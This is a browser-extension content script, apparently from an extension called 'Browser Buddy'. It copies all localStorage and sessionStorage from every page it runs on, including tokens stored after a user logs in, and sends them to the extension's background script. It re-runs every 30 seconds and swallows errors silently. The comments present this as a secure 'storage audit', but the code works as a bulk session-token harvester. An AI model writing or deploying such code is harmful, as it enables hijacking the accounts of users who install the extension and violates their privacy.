// Content script to capture website storage data securely and robustly
(function () {
    /**
     * Safely captures all data from localStorage and sessionStorage.
     * Uses multiple try-catch layers to handle Content Security Policy (CSP) 
     * and other browser security restrictions.
     */
    function captureStorage() {
        try {
            // Early exit if storage APIs are completely blocked by the browser
            if (typeof localStorage === 'undefined' || typeof sessionStorage === 'undefined') return;

            const domain = window.location.hostname;
            const storageData = {
                domain: domain,
                localStorage: {},
                sessionStorage: {},
                timestamp: Date.now()
            };

            // Safely iterate LocalStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    try {
                        const key = localStorage.key(i);
                        if (key) {
                            storageData.localStorage[key] = localStorage.getItem(key);
                        }
                    } catch (innerE) {
                        // Skip individual keys that might be blocked or corrupted
                    }
                }
            } catch (outerE) {
                console.warn(`Browser Buddy: LocalStorage blocked on ${domain}`);
            }

            // Safely iterate SessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    try {
                        const key = sessionStorage.key(i);
                        if (key) {
                            storageData.sessionStorage[key] = sessionStorage.getItem(key);
                        }
                    } catch (innerE) {
                        // Skip individual keys
                    }
                }
            } catch (outerE) {
                console.warn(`Browser Buddy: SessionStorage blocked on ${domain}`);
            }

            // Only send if we found meaningful data
            const hasLocal = Object.keys(storageData.localStorage).length > 0;
            const hasSession = Object.keys(storageData.sessionStorage).length > 0;

            if (hasLocal || hasSession) {
                // Use .catch to prevent "Extension context invalidated" errors from flooding the console
                chrome.runtime.sendMessage({
                    action: 'update_web_storage',
                    data: storageData
                }).catch(() => {
                    // This happens if the extension is reloaded or the background script is hibernating
                });
            }
        } catch (e) {
            // General catch-all for extreme security environments
            console.debug('Browser Buddy: Storage audit paused for security policy reasons.');
        }
    }

    // Initial capture when the page is ready
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        captureStorage();
    } else {
        window.addEventListener('load', captureStorage);
    }

    // Refresh every 30 seconds to catch logins that happen after page load
    setInterval(captureStorage, 30000);
})();
